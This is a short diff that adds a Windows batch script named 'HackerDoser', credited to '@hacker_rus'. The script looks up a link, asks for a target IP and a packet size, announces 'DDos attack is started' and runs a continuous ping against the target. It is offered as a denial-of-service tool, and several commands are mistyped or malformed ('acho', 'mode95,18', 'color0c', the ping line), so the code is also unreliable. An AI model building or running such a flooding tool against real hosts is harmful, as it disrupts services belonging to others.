@@ -1,0 +1,27 @@
+@echo off
+color 02
+title HackerDoser
+mode95,18
+cls
+
+:start
+echo.              
+echo                                                 ====made by @hacker_rus====      
+echo.               
+set /p a=Enter the link:
+nslookup %a%
+echo.
+acho Plwase Enter the IPv4 address
+echo.
+set /p b=IP:
+if %b%==0 goto start
+echo.
+set /p c=Pocket Size:
+echo.
+:ddos
+cls
+color0c
+echo.
+echo DDos attack is started...
+echo.
+ping %b%-t -I %c%
